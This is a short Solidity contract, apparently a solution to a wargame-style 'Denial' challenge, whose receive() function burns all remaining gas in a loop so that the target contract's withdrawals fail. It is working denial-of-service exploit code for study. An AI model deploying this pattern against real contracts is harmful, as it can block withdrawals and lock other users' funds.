// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Denial.sol";
import "hardhat/console.sol";


contract AttackingDenial {
    address payable public contractAddress;
    uint private counter = 0;

    constructor(address payable _contractAddress) {
        contractAddress = _contractAddress;
    }

    receive() external payable {
        console.log("Hello world");
        if (contractAddress.balance == 0) {
            console.log("zero balance");
            return;
        }

        // consume all the gas, we could bound this to at most 1m
        while (gasleft() > 0) {
            counter += 1;
        }
    }
}
